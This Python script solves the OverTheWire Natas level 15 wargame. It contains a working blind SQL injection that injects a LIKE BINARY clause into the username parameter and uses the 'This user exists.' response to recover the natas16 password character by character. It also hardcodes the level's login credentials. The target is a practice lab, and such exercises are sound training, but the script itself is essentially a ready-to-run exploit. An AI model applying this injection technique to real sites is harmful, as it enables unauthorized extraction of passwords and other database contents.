import requests
from requests.auth import HTTPBasicAuth
import json

# Set up all the variables and log in details
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered_chars = ''
passwordlist= []
exists_str = "This user exists."

url = 'http://natas15.natas.labs.overthewire.org/'

natas_usr   = 'natas15'
natas_pword = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

# The code below would usually run, but I ran this first and saved to list so I could come back to it.

### Find the list of chars in pword
##for ch in chars:
##    url_joined = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',ch,'%','&debug'])
##    r = requests.get(url_joined, auth=(natas_usr,natas_pword))
##    if exists_str in r.text:
##        passwordlist.append(ch)
##        print("Password Dictionary: " + json.dumps(passwordlist))
##    else : print(ch + " is not in the password")
# List is: ["a", "c", "e", "h", "i", "j", "m", "n", "p", "q", "t", "w", "B", "E", "H", "I", "N", "O", "R", "W", "0", "3", "5", "6", "9"]


# Test the possible chars in order:
passwordlist = ["a", "c", "e", "h", "i", "j", "m", "n", "p", "q", "t", "w", "B", "E", "H", "I", "N", "O", "R", "W", "0", "3", "5", "6", "9"]
password = ''

# Loop through all the characters that are in the list, and when there is a hit add it to the password.
for i in range(1,33):
    print("Beginning char-by-char break of the password")
    for ch in passwordlist:
        crt_pword = ''.join([password,ch])
        url_joined = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',crt_pword,'%','&debug'])
        r = requests.get(url_joined, auth=(natas_usr,natas_pword))
        if exists_str in r.text:
            password = crt_pword
            print("Password " + str(i) + ": " + password )
            break
